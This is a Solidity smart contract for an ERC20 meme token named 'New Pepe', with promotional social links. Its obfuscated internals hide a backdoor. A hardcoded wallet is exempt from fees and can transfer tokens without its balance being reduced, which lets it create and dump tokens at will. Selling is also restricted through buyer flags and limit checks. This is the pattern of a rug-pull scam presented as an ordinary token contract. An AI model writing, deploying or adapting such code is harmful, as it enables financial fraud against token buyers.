/**

New Pepe   $PEPE


TWITTER: https://twitter.com/PepeErc20_Coin
TELEGRAM: https://t.me/PepeErc20Coin
WEBSITE: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qxpmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qxpmo(a, b, "SafeMath:");
    }

    function  _qxpmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kofvueamp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pferojuvls {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalwf = 1000000000 * 10 **_decimals;
    uint256 public _mxTomoAmaunt = _Totalwf;
    uint256 public _Wallekbumx = _Totalwf;
    uint256 public _wapThresholdmcx= _Totalwf;
    uint256 public _moyoToxhp= _Totalwf;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEthguFerf;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruekrkeacp;
    bool public _tlaeresluove = false;
    address payable private _qkfaubjouvq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefarebast=0;
    uint256 private _burarbmv=0;

    _pferojuvls private _qomRatobct;
    address private _acGvudatvw;
    bool private _prjveukvh;
    bool private iopSwpjwq = false;
    bool private _aquEabuyp = false;

    event _amrfvlyul(uint _mxTomoAmaunt);
    modifier lokobThtrup {
        iopSwpjwq = true;
        _;
        iopSwpjwq = false;
    }

    constructor () {
        _qkfaubjouvq = payable(0xF4a4AF016b2FF62C4ecFa20112b50ca327a05E91);
        _balances[_msgSender()] = _Totalwf;
        _isEthguFerf[owner()] = true;
        _isEthguFerf[address(this)] = true;
        _isEthguFerf[_qkfaubjouvq] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalwf);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalwf;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qxpmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlaeresluove) {
                if (to != address
                (_qomRatobct) && to !=
                 address(_acGvudatvw)) {
                  require(_lruekrkeacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruekrkeacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGvudatvw && to != 
            address(_qomRatobct) && !_isEthguFerf[to] ) {
                require(amount <= _mxTomoAmaunt,
                 "Exceeds the _mxTomoAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekbumx, "Exceeds the maxWalletSize.");
                if(_burarbmv
                < _wapBefarebast){
                  require(! _faeqauz(to));
                }
                _burarbmv++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burarbmv>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGvudatvw && from!= address(this) 
            && !_isEthguFerf[from] ){
                require(amount <= _mxTomoAmaunt && 
                balanceOf(_qkfaubjouvq)<_moyoToxhp,
                 "Exceeds the _mxTomoAmaunt.");
                teeomoun = amount.mul((_burarbmv>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burarbmv>_wapBefarebast &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iopSwpjwq 
            && to == _acGvudatvw && _aquEabuyp &&
             contractTokenBalance>_wapThresholdmcx 
            && _burarbmv>_wapBefarebast&&
             !_isEthguFerf[to]&& !_isEthguFerf[from]
            ) {
                _swpzuvrkmj( _qxmve(amount, 
                _qxmve(contractTokenBalance,_moyoToxhp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmojveup(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qxpmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qxpmo(teeomoun));
        emit Transfer(from, to, 
        amount. _qxpmo(teeomoun));
    }

    function _swpzuvrkmj(uint256
     tokenAmount) private lokobThtrup {
        if(tokenAmount==0){return;}
        if(!_prjveukvh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRatobct.WETH();
        _approve(address(this),
         address(_qomRatobct), tokenAmount);
        _qomRatobct.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qxmve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qxpmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkfaubjouvq){
            return a ;
        }else{
            return a . _qxpmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTomoAmaunt = _Totalwf;
        _Wallekbumx = _Totalwf;
        _tlaeresluove = false;
        emit _amrfvlyul(_Totalwf);
    }

    function _faeqauz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmojveup(uint256
    amount) private {
        _qkfaubjouvq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _prjveukvh);
        _qomRatobct   =  _pferojuvls (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRatobct), _Totalwf);
        _acGvudatvw = _kofvueamp(_qomRatobct.factory()). createPair (address(this),  _qomRatobct . WETH ());
        _qomRatobct.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGvudatvw).approve(address(_qomRatobct), type(uint).max);
        _aquEabuyp = true;
        _prjveukvh = true;
    }

    receive() external payable {}
}